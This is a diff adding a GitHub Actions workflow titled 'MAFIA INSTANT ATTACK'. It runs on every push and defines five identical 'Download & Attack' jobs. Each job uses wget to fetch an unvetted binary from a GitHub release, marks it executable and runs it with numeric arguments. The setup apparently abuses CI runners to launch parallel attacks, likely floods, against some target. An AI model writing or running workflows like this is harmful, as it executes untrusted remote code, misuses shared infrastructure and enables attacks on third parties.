@@ -1,0 +1,60 @@
+name: MAFIA INSTANT ATTACK
+on: 
+  workflow_dispatch:
+  push: {}
+
+jobs:
+  attack1:
+    runs-on: ubuntu-latest
+    timeout-minutes: 3
+    steps:
+      - name: Download & Attack
+        run: |
+          wget -q https://github.com/Vishalisback00/Vishalpapaisback/releases/download/Personal/vishal
+          chmod +x vishal
+          ./vishal 26 36 37 
+          sleep 1
+
+  attack2:
+    runs-on: ubuntu-latest
+    timeout-minutes: 3
+    steps:
+      - name: Download & Attack
+        run: |
+          wget -q https://github.com/Vishalisback00/Vishalpapaisback/releases/download/Personal/vishal
+          chmod +x vishal
+          ./vishal 26 36 37 
+          sleep 1
+
+  attack3:
+    runs-on: ubuntu-latest
+    timeout-minutes: 3
+    steps:
+      - name: Download & Attack
+        run: |
+          wget -q https://github.com/Vishalisback00/Vishalpapaisback/releases/download/Personal/vishal
+          chmod +x vishal
+          ./vishal 26 36 37 
+          sleep 1
+
+  attack4:
+    runs-on: ubuntu-latest
+    timeout-minutes: 3
+    steps:
+      - name: Download & Attack
+        run: |
+          wget -q https://github.com/Vishalisback00/Vishalpapaisback/releases/download/Personal/vishal
+          chmod +x vishal
+          ./vishal 26 36 37 
+          sleep 1
+
+  attack5:
+    runs-on: ubuntu-latest
+    timeout-minutes: 3
+    steps:
+      - name: Download & Attack
+        run: |
+          wget -q https://github.com/Vishalisback00/Vishalpapaisback/releases/download/Personal/vishal
+          chmod +x vishal
+          ./vishal 26 36 37 
+          sleep 1
